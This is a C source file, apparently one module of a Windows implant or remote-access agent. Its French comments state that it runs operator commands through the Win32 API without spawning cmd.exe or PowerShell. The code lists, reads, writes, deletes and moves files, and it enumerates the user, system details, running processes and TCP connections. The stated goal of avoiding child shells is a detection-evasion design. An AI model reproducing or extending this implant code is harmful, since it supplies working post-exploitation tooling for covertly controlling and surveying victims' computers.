/*
** shell.c — Module shell built-in natif (ticket #38)
**
** Exécute des commandes système via l'API Win32 directement :
** aucun spawn de cmd.exe, powershell.exe ou autre processus.
** Toutes les fonctions utilisent les variantes ANSI (A) pour rester
** cohérentes avec le reste de l'implant.
*/

/* Ordre obligatoire sous Windows : winsock2.h avant windows.h avant iphlpapi.h.
** Chaque bloc séparé par une ligne vide empêche clang-format de réordonner. */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>

#include <windows.h>

#include <iphlpapi.h>
#include <tlhelp32.h>

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "shell.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define SHELL_MAX_PATH 1024

/* ------------------------------------------------------------------ */
/* Tampon de sortie borné (64 Ko max)                                 */
/* ------------------------------------------------------------------ */

typedef struct {
    char data[SHELL_BUFFER_SIZE];
    size_t len;
} shell_buf;

static void sb_init(shell_buf *sb) {
    sb->len = 0;
    sb->data[0] = '\0';
}

static void sb_append(shell_buf *sb, const char *fmt, ...) {
    va_list ap;
    int written;
    size_t space;

    if (sb->len >= SHELL_BUFFER_SIZE - 1)
        return;
    space = SHELL_BUFFER_SIZE - 1 - sb->len;
    va_start(ap, fmt);
    written = vsnprintf(sb->data + sb->len, space, fmt, ap);
    va_end(ap);
    if (written < 0)
        return;
    if ((size_t)written > space)
        written = (int)space;
    sb->len += (size_t)written;
    sb->data[sb->len] = '\0';
}

static char *sb_dup(shell_buf *sb) {
    char *out = malloc(sb->len + 1);

    if (out == NULL)
        return NULL;
    memcpy(out, sb->data, sb->len + 1);
    return out;
}

/* ------------------------------------------------------------------ */
/* Commandes : système de fichiers                                    */
/* ------------------------------------------------------------------ */

static char *cmd_ls(const char *path) {
    shell_buf sb;
    char pattern[SHELL_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    size_t plen;

    if (path == NULL || *path == '\0')
        snprintf(pattern, sizeof(pattern), "*");
    else if (strchr(path, '*') != NULL || strchr(path, '?') != NULL)
        snprintf(pattern, sizeof(pattern), "%s", path);
    else {
        plen = strlen(path);
        if (plen > 0 && (path[plen - 1] == '\\' || path[plen - 1] == '/'))
            snprintf(pattern, sizeof(pattern), "%s*", path);
        else
            snprintf(pattern, sizeof(pattern), "%s\\*", path);
    }
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        char *err = malloc(128);

        if (err != NULL)
            snprintf(err, 128, "ls: cannot list '%s' (error %lu)\n", path ? path : ".",
                     GetLastError());
        return err;
    }
    sb_init(&sb);
    do {
        unsigned long long size;

        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            sb_append(&sb, "[DIR ] %s\n", fd.cFileName);
        else
            sb_append(&sb, "%6llu  %s\n", size, fd.cFileName);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return sb_dup(&sb);
}

static char *cmd_cd(const char *path) {
    shell_buf sb;

    if (path == NULL || *path == '\0') {
        char cur[SHELL_MAX_PATH];

        if (GetCurrentDirectoryA(sizeof(cur), cur) == 0)
            return NULL;
        sb_init(&sb);
        sb_append(&sb, "%s\n", cur);
        return sb_dup(&sb);
    }
    sb_init(&sb);
    if (SetCurrentDirectoryA(path))
        sb_append(&sb, "cd: %s\n", path);
    else
        sb_append(&sb, "cd: cannot change to '%s' (error %lu)\n", path, GetLastError());
    return sb_dup(&sb);
}

static char *cmd_pwd(void) {
    char cur[SHELL_MAX_PATH];

    if (GetCurrentDirectoryA(sizeof(cur), cur) == 0)
        return NULL;
    char *out = malloc(strlen(cur) + 2);

    if (out != NULL)
        snprintf(out, strlen(cur) + 2, "%s\n", cur);
    return out;
}

static char *cmd_cat(const char *file) {
    HANDLE h;
    DWORD size;
    DWORD read_bytes = 0;
    char *out;

    if (file == NULL || *file == '\0')
        return NULL;
    h = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
                    NULL);
    if (h == INVALID_HANDLE_VALUE) {
        out = malloc(128);
        if (out != NULL)
            snprintf(out, 128, "cat: cannot open '%s' (error %lu)\n", file, GetLastError());
        return out;
    }
    size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size > SHELL_BUFFER_SIZE - 1)
        size = SHELL_BUFFER_SIZE - 1;
    out = malloc((size_t)size + 1);
    if (out == NULL) {
        CloseHandle(h);
        return NULL;
    }
    if (ReadFile(h, out, size, &read_bytes, NULL) == 0)
        read_bytes = 0;
    out[read_bytes] = '\0';
    CloseHandle(h);
    return out;
}

static char *cmd_write(const char *args) {
    const char *space;
    const char *content;
    char file[SHELL_MAX_PATH];
    size_t flen;
    HANDLE h;
    DWORD written_bytes = 0;
    shell_buf sb;

    if (args == NULL || *args == '\0')
        return NULL;
    space = strchr(args, ' ');
    if (space == NULL)
        return NULL;
    flen = (size_t)(space - args);
    if (flen == 0 || flen >= sizeof(file))
        return NULL;
    memcpy(file, args, flen);
    file[flen] = '\0';
    content = space + 1;
    h = CreateFileA(file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        char *err = malloc(128);

        if (err != NULL)
            snprintf(err, 128, "write: cannot create '%s' (error %lu)\n", file, GetLastError());
        return err;
    }
    WriteFile(h, content, (DWORD)strlen(content), &written_bytes, NULL);
    CloseHandle(h);
    sb_init(&sb);
    sb_append(&sb, "write: %lu bytes written to %s\n", written_bytes, file);
    return sb_dup(&sb);
}

static char *cmd_del(const char *path) {
    shell_buf sb;

    if (path == NULL || *path == '\0')
        return NULL;
    sb_init(&sb);
    if (DeleteFileA(path))
        sb_append(&sb, "del: %s removed\n", path);
    else
        sb_append(&sb, "del: cannot remove '%s' (error %lu)\n", path, GetLastError());
    return sb_dup(&sb);
}

static char *cmd_mkdir(const char *path) {
    shell_buf sb;

    if (path == NULL || *path == '\0')
        return NULL;
    sb_init(&sb);
    if (CreateDirectoryA(path, NULL))
        sb_append(&sb, "mkdir: %s created\n", path);
    else
        sb_append(&sb, "mkdir: cannot create '%s' (error %lu)\n", path, GetLastError());
    return sb_dup(&sb);
}

static char *cmd_rmdir(const char *path) {
    shell_buf sb;

    if (path == NULL || *path == '\0')
        return NULL;
    sb_init(&sb);
    if (RemoveDirectoryA(path))
        sb_append(&sb, "rmdir: %s removed\n", path);
    else
        sb_append(&sb, "rmdir: cannot remove '%s' (error %lu)\n", path, GetLastError());
    return sb_dup(&sb);
}

/* Extrait deux mots séparés par des espaces/tabulations.
** Retourne 1 si OK, 0 sinon. Ne modifie pas `args`. */
static int parse_two_args(const char *args, char *a, size_t asize, char *b, size_t bsize) {
    const char *p = args;
    const char *start;
    size_t len;

    while (*p == ' ' || *p == '\t')
        p++;
    start = p;
    while (*p != '\0' && *p != ' ' && *p != '\t')
        p++;
    len = (size_t)(p - start);
    if (len == 0 || len >= asize)
        return 0;
    memcpy(a, start, len);
    a[len] = '\0';
    while (*p == ' ' || *p == '\t')
        p++;
    start = p;
    while (*p != '\0' && *p != ' ' && *p != '\t')
        p++;
    len = (size_t)(p - start);
    if (len == 0 || len >= bsize)
        return 0;
    memcpy(b, start, len);
    b[len] = '\0';
    return 1;
}

static char *cmd_cp(const char *args) {
    char src[SHELL_MAX_PATH];
    char dst[SHELL_MAX_PATH];
    shell_buf sb;

    if (args == NULL || !parse_two_args(args, src, sizeof(src), dst, sizeof(dst)))
        return NULL;
    sb_init(&sb);
    if (CopyFileA(src, dst, FALSE))
        sb_append(&sb, "cp: %s -> %s\n", src, dst);
    else
        sb_append(&sb, "cp: cannot copy '%s' to '%s' (error %lu)\n", src, dst, GetLastError());
    return sb_dup(&sb);
}

static char *cmd_mv(const char *args) {
    char src[SHELL_MAX_PATH];
    char dst[SHELL_MAX_PATH];
    shell_buf sb;

    if (args == NULL || !parse_two_args(args, src, sizeof(src), dst, sizeof(dst)))
        return NULL;
    sb_init(&sb);
    if (MoveFileA(src, dst))
        sb_append(&sb, "mv: %s -> %s\n", src, dst);
    else
        sb_append(&sb, "mv: cannot move '%s' to '%s' (error %lu)\n", src, dst, GetLastError());
    return sb_dup(&sb);
}

/* ------------------------------------------------------------------ */
/* Commandes : information système                                    */
/* ------------------------------------------------------------------ */

static char *cmd_whoami(void) {
    char user[256];
    DWORD size = sizeof(user);
    char *out;

    if (GetUserNameA(user, &size) == 0)
        return NULL;
    out = malloc(size + 1);
    if (out != NULL)
        snprintf(out, size + 1, "%s\n", user);
    return out;
}

typedef LONG(WINAPI *rtl_get_version_ptr)(PRTL_OSVERSIONINFOW);

static char *cmd_sysinfo(void) {
    shell_buf sb;
    SYSTEM_INFO si;
    MEMORYSTATUSEX ms;
    RTL_OSVERSIONINFOW vi;
    HMODULE ntdll;
    rtl_get_version_ptr rtl_get_version;
    const char *arch;

    GetSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        arch = "x64";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        arch = "x86";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        arch = "ARM";
        break;
    default:
        arch = "unknown";
        break;
    }
    sb_init(&sb);
    sb_append(&sb, "arch: %s\n", arch);
    sb_append(&sb, "cores: %lu\n", si.dwNumberOfProcessors);
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        sb_append(&sb, "ram_total: %.1f GB\n",
                  (double)ms.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
        sb_append(&sb, "ram_avail: %.1f GB\n",
                  (double)ms.ullAvailPhys / (1024.0 * 1024.0 * 1024.0));
    }
    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll != NULL) {
        rtl_get_version = (rtl_get_version_ptr)(void *)GetProcAddress(ntdll, "RtlGetVersion");
        if (rtl_get_version != NULL) {
            memset(&vi, 0, sizeof(vi));
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (rtl_get_version(&vi) == 0)
                sb_append(&sb, "os: Windows %lu.%lu (build %lu)\n", vi.dwMajorVersion,
                          vi.dwMinorVersion, vi.dwBuildNumber);
        }
    }
    return sb_dup(&sb);
}

static char *cmd_ps(void) {
    shell_buf sb;
    HANDLE snap;
    PROCESSENTRY32 pe;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return NULL;
    sb_init(&sb);
    sb_append(&sb, "%6s %6s %s\n", "PID", "PPID", "NAME");
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            sb_append(&sb, "%6lu %6lu %s\n", pe.th32ProcessID, pe.th32ParentProcessID,
                      pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return sb_dup(&sb);
}

static char *cmd_netstat(void) {
    shell_buf sb;
    PMIB_TCPTABLE_OWNER_PID table = NULL;
    ULONG size = 0;
    DWORD i;

    GetExtendedTcpTable(NULL, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (size == 0)
        return NULL;
    table = malloc(size);
    if (table == NULL)
        return NULL;
    sb_init(&sb);
    if (GetExtendedTcpTable(table, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        sb_append(&sb, "%-22s %-22s %-8s %s\n", "LOCAL", "REMOTE", "STATE", "PID");
        for (i = 0; i < table->dwNumEntries; i++) {
            PMIB_TCPROW_OWNER_PID row = &table->table[i];
            DWORD la = ntohl(row->dwLocalAddr);
            DWORD ra = ntohl(row->dwRemoteAddr);
            USHORT lp = ntohs((u_short)row->dwLocalPort);
            USHORT rp = ntohs((u_short)row->dwRemotePort);
            const char *state;

            if (row->dwState == MIB_TCP_STATE_LISTEN)
                state = "LISTEN";
            else if (row->dwState == MIB_TCP_STATE_ESTAB)
                state = "ESTAB";
            else
                state = "other";
            sb_append(&sb, "%u.%u.%u.%u:%-5u %-3u.%u.%u.%u:%-5u %-8s %lu\n", (la >> 24) & 0xFF,
                      (la >> 16) & 0xFF, (la >> 8) & 0xFF, la & 0xFF, lp, (ra >> 24) & 0xFF,
                      (ra >> 16) & 0xFF, (ra >> 8) & 0xFF, ra & 0xFF, rp, state, row->dwOwningPid);
        }
    } else
        sb_append(&sb, "netstat: GetExtendedTcpTable failed (error %lu)\n", GetLastError());
    free(table);
    return sb_dup(&sb);
}

static char *cmd_help(void) {
    shell_buf sb;

    sb_init(&sb);
    sb_append(&sb, "built-in commands (no cmd.exe):\n");
    sb_append(&sb, "  ls [path]            list directory\n");
    sb_append(&sb, "  cd <path>            change directory\n");
    sb_append(&sb, "  pwd                  print working directory\n");
    sb_append(&sb, "  cat <file>           print file content\n");
    sb_append(&sb, "  write <file> <text>  write text to file\n");
    sb_append(&sb, "  del <file>           delete file\n");
    sb_append(&sb, "  mkdir <dir>          create directory\n");
    sb_append(&sb, "  rmdir <dir>          remove directory\n");
    sb_append(&sb, "  cp <src> <dst>       copy file\n");
    sb_append(&sb, "  mv <src> <dst>       move/rename file\n");
    sb_append(&sb, "  whoami               current user\n");
    sb_append(&sb, "  sysinfo              system information\n");
    sb_append(&sb, "  ps                   list processes\n");
    sb_append(&sb, "  netstat              TCP connections (IPv4)\n");
    return sb_dup(&sb);
}

/* ------------------------------------------------------------------ */
/* Routeur principal                                                  */
/* ------------------------------------------------------------------ */

char *shell_execute(const char *input) {
    char cmd[32];
    const char *p = input;
    const char *start;
    size_t len;

    if (input == NULL)
        return NULL;
    while (*p == ' ' || *p == '\t')
        p++;
    start = p;
    while (*p != '\0' && *p != ' ' && *p != '\t')
        p++;
    len = (size_t)(p - start);
    if (len == 0 || len >= sizeof(cmd))
        return NULL;
    memcpy(cmd, start, len);
    cmd[len] = '\0';
    while (*p == ' ' || *p == '\t')
        p++;

    if (strcmp(cmd, "ls") == 0 || strcmp(cmd, "dir") == 0)
        return cmd_ls(p);
    if (strcmp(cmd, "cd") == 0)
        return cmd_cd(p);
    if (strcmp(cmd, "pwd") == 0)
        return cmd_pwd();
    if (strcmp(cmd, "cat") == 0 || strcmp(cmd, "type") == 0)
        return cmd_cat(p);
    if (strcmp(cmd, "write") == 0)
        return cmd_write(p);
    if (strcmp(cmd, "del") == 0 || strcmp(cmd, "rm") == 0)
        return cmd_del(p);
    if (strcmp(cmd, "mkdir") == 0 || strcmp(cmd, "md") == 0)
        return cmd_mkdir(p);
    if (strcmp(cmd, "rmdir") == 0 || strcmp(cmd, "rd") == 0)
        return cmd_rmdir(p);
    if (strcmp(cmd, "cp") == 0 || strcmp(cmd, "copy") == 0)
        return cmd_cp(p);
    if (strcmp(cmd, "mv") == 0 || strcmp(cmd, "move") == 0 || strcmp(cmd, "ren") == 0)
        return cmd_mv(p);
    if (strcmp(cmd, "whoami") == 0)
        return cmd_whoami();
    if (strcmp(cmd, "sysinfo") == 0)
        return cmd_sysinfo();
    if (strcmp(cmd, "ps") == 0 || strcmp(cmd, "listprocs") == 0)
        return cmd_ps();
    if (strcmp(cmd, "netstat") == 0 || strcmp(cmd, "connections") == 0)
        return cmd_netstat();
    if (strcmp(cmd, "help") == 0)
        return cmd_help();
    return NULL;
}
